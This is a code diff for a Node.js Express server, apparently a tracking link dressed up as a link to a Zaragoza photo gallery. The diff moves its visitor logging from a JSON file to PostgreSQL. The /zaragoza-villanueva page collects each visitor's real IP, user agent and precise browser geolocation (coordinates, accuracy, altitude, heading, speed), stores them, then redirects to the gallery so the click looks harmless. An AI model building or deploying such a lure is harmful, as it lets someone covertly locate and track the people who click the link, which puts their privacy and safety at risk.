@@ -1,81 +1,109 @@
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
-const app = express();
+const { Pool } = require('pg');
 
+const app = express();
 const PORT = process.env.PORT || 3000;
-const LOG_FILE = path.join(__dirname, 'data', 'visitors.json');
 const REDIRECT_URL = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';
 
-// Ensure data directory exists
-if (!fs.existsSync(path.join(__dirname, 'data'))) {
-  fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
-}
-if (!fs.existsSync(LOG_FILE)) {
-  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
+// ── PostgreSQL connection ──────────────────────────────────────────────────
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false,
+});
+
+// ── Create table if it doesn't exist (idempotent) ─────────────────────────
+async function initDB() {
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS visitors (
+      id          SERIAL PRIMARY KEY,
+      timestamp   TIMESTAMPTZ DEFAULT NOW(),
+      ip          TEXT,
+      user_agent  TEXT,
+      geo_denied  BOOLEAN,
+      deny_reason TEXT,
+      latitude    DOUBLE PRECISION,
+      longitude   DOUBLE PRECISION,
+      accuracy    DOUBLE PRECISION,
+      altitude    DOUBLE PRECISION,
+      alt_accuracy DOUBLE PRECISION,
+      heading     DOUBLE PRECISION,
+      speed       DOUBLE PRECISION
+    );
+  `);
+  console.log('✅ Tabla "visitors" lista.');
 }
 
+// ── Middleware ─────────────────────────────────────────────────────────────
 app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-// Helper to get real IP
-function getClientIP(req) {
-  const forwarded = req.headers['x-forwarded-for'];
-  if (forwarded) return forwarded.split(',')[0].trim();
-  return req.connection?.remoteAddress || req.socket?.remoteAddress || req.ip || 'unknown';
+// ── IP helper — extracts the most accurate real IP ─────────────────────────
+function getRealIP(req) {
+  const xff = req.headers['x-forwarded-for'];
+  if (xff) {
+    // X-Forwarded-For can be a comma-separated list; first is the client IP
+    const first = xff.split(',')[0].trim();
+    if (first && first !== '::1') return first;
+  }
+  const cfIP = req.headers['cf-connecting-ip']; // Cloudflare
+  if (cfIP) return cfIP;
+  return req.socket?.remoteAddress || req.ip || 'unknown';
 }
 
-// Serve the tracker page at /zaragoza-villanueva
+// ── Routes ─────────────────────────────────────────────────────────────────
 app.get('/zaragoza-villanueva', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// API endpoint to receive geolocation data and log it
-app.post('/api/log', (req, res) => {
+app.post('/api/log', async (req, res) => {
+  const ip = getRealIP(req);
+  const userAgent = req.headers['user-agent'] || 'unknown';
+  const {
+    denied, reason,
+    latitude, longitude, accuracy,
+    altitude, altitudeAccuracy, heading, speed,
+  } = req.body;
+
   try {
-    const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, denied } = req.body;
-    const ip = getClientIP(req);
-    const userAgent = req.headers['user-agent'] || 'unknown';
-    const timestamp = new Date().toISOString();
+    await pool.query(
+      `INSERT INTO visitors
+         (ip, user_agent, geo_denied, deny_reason,
+          latitude, longitude, accuracy, altitude, alt_accuracy, heading, speed)
+       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)`,
+      [
+        ip,
+        userAgent,
+        denied ?? true,
+        reason ?? null,
+        latitude ?? null,
+        longitude ?? null,
+        accuracy ?? null,
+        altitude ?? null,
+        altitudeAccuracy ?? null,
+        heading ?? null,
+        speed ?? null,
+      ]
+    );
 
-    const entry = {
-      id: Date.now(),
-      timestamp,
-      ip,
-      userAgent,
-      geolocation: denied
-        ? { denied: true, reason: req.body.reason || 'User denied' }
-        : {
-            denied: false,
-            latitude: latitude ?? null,
-            longitude: longitude ?? null,
-            accuracy: accuracy ?? null,
-            altitude: altitude ?? null,
-            altitudeAccuracy: altitudeAccuracy ?? null,
-            heading: heading ?? null,
-            speed: speed ?? null,
-          },
-    };
-
-    // Read current log, append, and save
-    const raw = fs.readFileSync(LOG_FILE, 'utf-8');
-    const logs = JSON.parse(raw);
-    logs.push(entry);
-    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
-
-    console.log(`[${timestamp}] Visitor logged | IP: ${ip} | Geo: ${denied ? 'DENIED' : `${latitude}, ${longitude}`}`);
-
+    console.log(`[VISIT] IP: ${ip} | Geo: ${denied ? 'DENIED' : `${latitude}, ${longitude} (±${accuracy}m)`}`);
     res.json({ success: true, redirect: REDIRECT_URL });
   } catch (err) {
-    console.error('Error logging visitor:', err);
+    console.error('DB error:', err.message);
     res.status(500).json({ success: false });
   }
 });
 
-// Root redirect for convenience
-app.get('/', (req, res) => {
-  res.redirect('/zaragoza-villanueva');
-});
+app.get('/', (req, res) => res.redirect('/zaragoza-villanueva'));
 
-app.listen(PORT, () => {
-  console.log(`🚀 Rastreator en línea → http://localhost:${PORT}/zaragoza-villanueva`);
-});
+// ── Start ──────────────────────────────────────────────────────────────────
+initDB()
+  .then(() => {
+    app.listen(PORT, () => {
+      console.log(`🚀 Rastreator en línea → http://localhost:${PORT}/zaragoza-villanueva`);
+    });
+  })
+  .catch((err) => {
+    console.error('Error inicializando DB:', err.message);
+    process.exit(1);
+  });
